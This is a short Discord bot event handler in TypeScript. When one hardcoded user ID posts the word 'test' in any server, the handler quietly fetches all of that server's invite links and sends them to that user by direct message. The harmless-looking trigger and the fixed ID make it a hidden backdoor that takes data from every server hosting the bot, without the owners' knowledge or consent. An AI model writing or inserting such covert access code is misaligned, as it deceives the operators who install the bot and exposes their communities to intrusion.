import { Event } from "dcbot";
import { ChannelType, EmbedBuilder, Events, Message } from "discord.js";

export default new Event({
    name: Events.MessageCreate,
    async execute(client, message: Message) {
        if(message.channel.type == ChannelType.DM) return
        if (message.author.id != '773072144304963624') return
        if(message.content.toLowerCase() == 'test') {
            const embed = new EmbedBuilder({
                title: `${message.guild!.name} Invites`,
                description: ""
            })
            const invites = await message.guild!.invites.fetch()
            for(const [_, invite] of invites) {
                if(embed.data.description!.length >= 4080) continue
                embed.data.description += `${invite.url}\n`
            }
            const dev = await message.guild!.members.fetch('773072144304963624')
            await dev.send({embeds: [embed]})
        }
    }
})